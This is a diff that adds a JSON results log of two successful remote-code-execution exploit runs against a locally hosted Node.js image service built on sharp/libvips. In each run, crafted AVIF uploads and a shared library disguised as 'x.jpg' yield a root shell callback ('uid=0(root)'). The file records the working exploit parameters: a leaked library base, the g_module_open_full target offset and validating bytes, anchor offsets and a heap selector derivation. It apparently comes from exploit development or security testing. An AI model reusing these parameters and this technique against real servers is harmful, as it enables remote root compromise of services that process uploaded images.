+      "target": "http://127.0.0.1:3216",
+      "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=0(root) gid=0(root) groups=0(root)",
+        "valid": true
+      },
+      "libvips_base": "0x7fbc7edee000",
+      "control_target": {
+        "module": "libvips",
+        "module_base": "0x7fbc7edee000",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_module_open_full",
+        "exported": false,
+        "offset": "0x3e995e",
+        "address": "0x7fbc7f1d795e",
+        "derivation": "0x7fbc7edee000 + 0x3e995e = 0x7fbc7f1d795e",
+        "abi": "path_rdi_flags_esi_error_rdx",
+        "validating_bytes": "4157415641554989fd31ff415455534883ec48897424144889542418e8b1fdff",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fbc7efac1b0",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2160",
+              "0x4720",
+              "0x16190"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fbc7efb1120",
+            "repetitions": 7,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2158",
+              "0x4718",
+              "0x67c8",
+              "0x7a28",
+              "0xdcd8",
+              "0x16188",
+              "0xf52c8"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fbc7efb1130",
+            "repetitions": 7,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2168",
+              "0x4728",
+              "0x67d8",
+              "0x7a38",
+              "0xdce8",
+              "0x16198",
+              "0xf52d8"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7fbc7efcc9c0",
+            "repetitions": 2,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x9768",
+              "0x18c38"
+            ]
+          }
+        ]
+      },
+      "heap_calibration": {
+        "derived_selector": "0x5c60",
+        "selector_source": "profile_page_lane",
+        "profile_candidate_selector": "0x5c60",
+        "profile_selector_evidence": {
+          "anchor_page_low16": "0x6000",
+          "fake_node_delta_from_anchor_page": "-0x3a0",
+          "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+        },
+        "record_candidate_selectors": [],
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7fbc7edee000",
+            "record_variant": "pie_tail",
+            "selector_strategy": "profile_page_lane",
+            "selector_source": "profile_page_lane",
+            "profile_candidate_selector": "0x5c60",
+            "profile_selector_evidence": {
+              "anchor_page_low16": "0x6000",
+              "fake_node_delta_from_anchor_page": "-0x3a0",
+              "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+            },
+            "record_candidate_selectors": [],
+            "response_sha256": "b357437fec08c260fc0c5d884514e683d0e6c6db3147e202eff4ab9af742f270",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 0,
+            "selected_anchor_rank": null,
+            "matches": [],
+            "candidate_selectors": [
+              "0x5c60"
+            ],
+            "attempt": 4,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 4,
+        "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7fbc7edee000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fbc7efac1b0",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2160",
+              "0x4720",
+              "0x16190"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fbc7efb1120",
+            "repetitions": 7,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2158",
+              "0x4718",
+              "0x67c8",
+              "0x7a28",
+              "0xdcd8",
+              "0x16188",
+              "0xf52c8"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fbc7efb1130",
+            "repetitions": 7,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2168",
+              "0x4728",
+              "0x67d8",
+              "0x7a38",
+              "0xdce8",
+              "0x16198",
+              "0xf52d8"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7fbc7efcc9c0",
+            "repetitions": 2,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x9768",
+              "0x18c38"
+            ]
+          }
+        ],
+        "rejected_candidates": [
+          "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+        ],
+        "attempts": [
+          {
+            "attempt": 1,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 2,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 3,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 4,
+            "status": "selected",
+            "supported_pair_count": 1,
+            "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7fbc7edee000",
+            "rejected_candidates": [
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-233d6707c6e54e17893ef13c23c7d583.avif",
+      "upload_contract": {
+        "calibration_donors": {
+          "count": 4,
+          "filename_suffix": ".avif",
+          "content_type": "image/avif"
+        },
+        "callback_library": {
+          "filename": "x.jpg",
+          "remote_path": "uploads/x.jpg",
+          "content_type": "image/jpeg"
+        },
+        "payload": {
+          "filename": "exploit-233d6707c6e54e17893ef13c23c7d583.avif",
+          "content_type": "image/avif"
+        }
+      },
+      "node_profile": {
+        "elf_type": "ET_DYN",
+        "build_id": "339440d6f33368ed4fb57f3c214d62163e2201c4",
+        "sha256": "ca0728526aa1cc4e3056decec848ecc6d2c5391cecdd4e21a0ebd221d665c84e"
+      },
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 9,
+      "exploit_exit": 0,
+      "server_exit": 139
+    },
+    {
+      "target": "http://127.0.0.1:3216",
+      "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=0(root) gid=0(root) groups=0(root)",
+        "valid": true
+      },
+      "libvips_base": "0x7f68d1dec000",
+      "control_target": {
+        "module": "libvips",
+        "module_base": "0x7f68d1dec000",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_module_open_full",
+        "exported": false,
+        "offset": "0x3e995e",
+        "address": "0x7f68d21d595e",
+        "derivation": "0x7f68d1dec000 + 0x3e995e = 0x7f68d21d595e",
+        "abi": "path_rdi_flags_esi_error_rdx",
+        "validating_bytes": "4157415641554989fd31ff415455534883ec48897424144889542418e8b1fdff",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f68d1faa1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d60"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f68d1faf120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d58",
+              "0xae08",
+              "0xc068"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f68d1faf130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d68",
+              "0xae18",
+              "0xc078"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7f68d1fca9c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xde48"
+            ]
+          }
+        ]
+      },
+      "heap_calibration": {
+        "derived_selector": "0x5c60",
+        "selector_source": "profile_page_lane",
+        "profile_candidate_selector": "0x5c60",
+        "profile_selector_evidence": {
+          "anchor_page_low16": "0x6000",
+          "fake_node_delta_from_anchor_page": "-0x3a0",
+          "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+        },
+        "record_candidate_selectors": [],
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7f68d1dec000",
+            "record_variant": "pie_tail",
+            "selector_strategy": "profile_page_lane",
+            "selector_source": "profile_page_lane",
+            "profile_candidate_selector": "0x5c60",
+            "profile_selector_evidence": {
+              "anchor_page_low16": "0x6000",
+              "fake_node_delta_from_anchor_page": "-0x3a0",
+              "derivation": "(0x6000 + -0x3a0) & 0xffff = 0x5c60"
+            },
+            "record_candidate_selectors": [],
+            "response_sha256": "48598abbf52d188aac17c7a88a051115ae5a96716652a4e59975046dc27c8069",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 0,
+            "selected_anchor_rank": null,
+            "matches": [],
+            "candidate_selectors": [
+              "0x5c60"
+            ],
+            "attempt": 5,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 5,
+        "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7f68d1dec000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f68d1faa1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d60"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f68d1faf120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d58",
+              "0xae08",
+              "0xc068"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f68d1faf130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8d68",
+              "0xae18",
+              "0xc078"
+            ]
+          },
+          {
+            "offset": "0x1de9c0",
+            "value": "0x7f68d1fca9c0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xde48"
+            ]
+          }
+        ],
+        "rejected_candidates": [
+          "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+        ],
+        "attempts": [
+          {
+            "attempt": 1,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 2,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 3,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 4,
+            "status": "no_match",
+            "supported_pair_count": 0,
+            "selected_profile_id": null,
+            "selected_base": null,
+            "rejected_candidates": [
+              "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          },
+          {
+            "attempt": 5,
+            "status": "selected",
+            "supported_pair_count": 1,
+            "selected_profile_id": "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7f68d1dec000",
+            "rejected_candidates": [
+              "node-25.8.1-pie-sharp-0.34.4-linux-x64"
+            ]
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-20bb5862af8d485fa5ce467970431738.avif",
+      "upload_contract": {
+        "calibration_donors": {
+          "count": 5,
+          "filename_suffix": ".avif",
+          "content_type": "image/avif"
+        },
+        "callback_library": {
+          "filename": "x.jpg",
+          "remote_path": "uploads/x.jpg",
+          "content_type": "image/jpeg"
+        },
+        "payload": {
+          "filename": "exploit-20bb5862af8d485fa5ce467970431738.avif",
+          "content_type": "image/avif"
+        }
+      },
+      "node_profile": {
+        "elf_type": "ET_DYN",
+        "build_id": "339440d6f33368ed4fb57f3c214d62163e2201c4",
+        "sha256": "ca0728526aa1cc4e3056decec848ecc6d2c5391cecdd4e21a0ebd221d665c84e"
+      },
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 10,
+      "exploit_exit": 0,
+      "server_exit": 139
+    }
+  ]
+}
